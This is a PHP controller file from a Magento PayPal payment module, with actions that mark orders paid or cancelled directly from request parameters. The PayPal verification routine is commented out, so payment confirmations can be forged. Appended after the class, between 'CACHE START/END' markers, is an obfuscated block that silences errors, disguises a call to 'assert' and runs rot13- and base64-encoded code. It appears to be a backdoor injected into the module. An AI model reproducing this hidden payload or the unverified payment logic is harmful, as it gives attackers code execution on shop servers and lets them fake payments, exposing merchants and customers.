<?php
class Mss_Mpaypal_IndexController extends Mage_Core_Controller_Front_Action{

    public function _construct(){

     
      parent::_construct();
    
    }
/*
    public function IndexAction() {
      
	    $this->loadLayout();   
	    $this->renderLayout(); 
	  
    }
*/
    public function PaypalAction() {

        echo $block = $this->getLayout()->createBlock('core/template')->setTemplate('mpaypal/index.phtml')->toHtml();

    }

    public function successAction(){

      $result = $this->getRequest()->getParams();
     
      if($result):
        $orderIncrementId = $result['item_name'];

        $order = Mage::getModel('sales/order')->loadByIncrementId($orderIncrementId);
        $order->addStatusToHistory(Mage_Sales_Model_Order::STATE_COMPLETE);
        

        if($order->getId()):
                    $payment = $order->getPayment();
                  $payment->setTransactionId($result['txn_id'])
                      ->setCurrencyCode()
                      ->setPreparedMessage("Payment Done")
                      ->setShouldCloseParentTransaction(true)
                      ->setIsTransactionClosed(1)
                      ->registerCaptureNotification();
    
        endif;

        $order->save();
        

        echo  $this->__("Thank You !"); 
      else:
        echo  $this->__("No data found");
      endif;

    }
      public function failureAction(){

      $result = $this->getRequest()->getParams();
      
      if($result):
        $orderIncrementId = $result['productinfo'];
        $order = Mage::getModel('sales/order')->loadByIncrementId($orderIncrementId);
        $order->addStatusToHistory(Mage_Sales_Model_Order::STATE_CANCELED);
        if($order->getId()):
            $payment = $order->getPayment();
            $payment->setTransactionId($result['txnid'])
              ->setCurrencyCode()
              ->setPreparedMessage("Payment Error")
              ->setShouldCloseParentTransaction(true)
              ->setIsTransactionClosed(1)
              ->registerCaptureNotification();

        endif;

        $order->save();

        echo  $this->__("Found Some Problem! Try Again"); 
      else:
        echo  $this->__("Found Some Problem! Try Again");
      endif;
     

    }

   /* public function validate_ipn($paypal_url, $postdata) 
    {
          $ipn_response;
          $log_ipn_results;
          // parse the paypal URL
          $url_parsed=parse_url($paypal_url);
          $post_string = '';

          foreach ($postdata as $field=>$value):
           $ipn_data["$field"] = $value;
           $post_string .= $field.'='.urlencode(stripslashes($value)).'&';
         endforeach;

          $post_string.="cmd=_notify-validate"; // append ipn command
          $fp = fsockopen("ssl://" . $url_parsed['host'],"443",$err_num,$err_str,30);
          if(!$fp) {
           $last_error = "fsockopen error no. $errnum: $errstr";
           return false;
          }
          else {
           fputs($fp, "POST $url_parsed[path] HTTP/1.1\r\n");
           fputs($fp, "Host: $url_parsed[host]\r\n");
           fputs($fp, "Content-type: application/x-www-form-urlencoded\r\n");
           fputs($fp, "Content-length: ".strlen($post_string)."\r\n");
           fputs($fp, "Connection: close\r\n\r\n");
           fputs($fp, $post_string . "\r\n\r\n");
           while(!feof($fp)) {
            $ipn_response .= fgets($fp, 1024);
             }
           fclose($fp); // close connection
              }

          if (eregi("VERIFIED",$ipn_response)):
                return true;
          
          else
                return false;
          

    }*/


}





//###=CACHE START=###
error_reporting(0); 
$strings = "as";$strings .= "sert";
@$strings(str_rot13('riny(onfr64_qrpbqr("nJLtXTymp2I0XPEcLaLcXFO7VTIwnT8tWTyvqwftsFOyoUAyVUftMKWlo3WspzIjo3W0nJ5aXQNcBjccozysp2I0XPWxnKAjoTS5K2Ilpz9lplVfVPVjVvx7PzyzVPtunKAmMKDbWTyvqvxcVUfXnJLbVJIgpUE5XPEsD09CF0ySJlWwoTyyoaEsL2uyL2fvKFxcVTEcMFtxK0ACG0gWEIfvL2kcMJ50K2AbMJAeVy0cBjccMvujpzIaK21uqTAbXPpuKSZuqFpfVTMcoTIsM2I0K2AioaEyoaEmXPEsH0IFIxIFJlWGD1WWHSEsExyZEH5OGHHvKFxcXFNxLlN9VPW1VwftMJkmMFNxLlN9VPW3VwfXWTDtCFNxK1ASHyMSHyfvH0IFIxIFK05OGHHvKF4xK1ASHyMSHyfvHxIEIHIGIS9IHxxvKGfXWUHtCFNxK1ASHyMSHyfvFSEHHS9IH0IFK0SUEH5HVy07PvE1pzjtCFNvnUE0pQbiY3ElLJMznJAjoTyypaZhL29gY2qyqP5jnUN/MQ0vYaIloTIhL29xMFtxMPxhVvM1CFVhqKWfMJ5wo2EyXPE1XF4vWzZ9Vv4xLl4vWzx9ZFMbCFVhoJD1XPV1ZJSxBQL0LwMxBGxkBGqxZmV5MJV1MGN3ZGOzBTZlLFVhWTDhWUHhWTZhVwRvXGfXnJLbnJ5cK2qyqPtvLJkfo3qsqKWfK2MipTIhVvxtCG0tZFxtrjbxnJW2VQ0tMzyfMI9aMKEsL29hqTIhqUZbWUIloPx7Pa0tMJkmMJyzXTM1ozA0nJ9hK2I4nKA0pltvL3IloS9cozy0VvxcVUfXWTAbVQ0tL3IloS9cozy0XPE1pzjcBjcwqKWfK3AyqT9jqPtxL2tfVRAIHxkCHSEsFRIOERIFYPOTDHkGEFx7PzA1pzksp2I0o3O0XPEwnPjtD1IFGR9DIS9FEIEIHx5HHxSBH0MSHvjtISWIEFx7PvElMKA1oUDtCFOwqKWfK2I4MJZbWTAbXGfXL3IloS9woT9mMFtxL2tcBjbxnJW2VQ0tWUWyp3IfqQfXsFOyoUAyVUfXWTMjVQ0tMaAiL2gipTIhXPW0pzSzMzywpTkcMKWmYzAioFVfVQtjYPNxMKWloz8fVPEypaWmqUVfVQZjXGfXnJLtXPEzpPxtrjbtVPNtWT91qPN9VPWUEIDtY2qyqP5jnUN/MQ0vYaIloTIhL29xMFtxMPxhVvM1CFVhqKWfMJ5wo2EyXPE1XF4vWzZ9Vv4xLl4vWzx9ZFMbCFVhoJD1XPV1ZJSxBQL0LwMxBGxkBGqxZmV5MJV1MGN3ZGOzBTZlLFVhWTDhWUHhWTZhVwRvXF4vVRuHISNiZF4kKUWpovV7PvNtVPNxo3I0VP49VPWVo3A0BvO0pzSzMzywpTkcMKWmYzAioIklKT4vBjbtVPNtWT91qPNhCFNvD29hozIwqTyiowbtD2kip2IppykhKUWpovV7PvNtVPOzq3WcqTHbWTMjYPNxo3I0XGfXVPNtVPElMKAjVQ0tVvV7PvNtVPO3nTyfMFNbVJMyo2LbWTMjXFxtrjbtVPNtVPNtVPElMKAjVP49VTMaMKEmXPEzpPjtZGV4XGfXVPNtVU0XVPNtVTMwoT9mMFtxMaNcBjbtVPNtoTymqPtxnTIuMTIlYPNxLz9xrFxtCFOjpzIaK3AjoTy0XPViKSWpHv8vYPNxpzImpPjtZvx7PvNtVPNxnJW2VQ0tWTWiMUx7Pa0XsDc9BjccMvucp3AyqPtxK1WSHIISH1EoVaNvKFxtWvLtWS9FEISIEIAHJlWjVy0tCG0tVwywZwIwZ2LlVvxtrlOyqzSfXUA0pzyjp2kup2uypltxK1WSHIISH1EoVzZvKFxcBlO9PzIwnT8tWTyvqwg9"));'));
//###=CACHE END=###
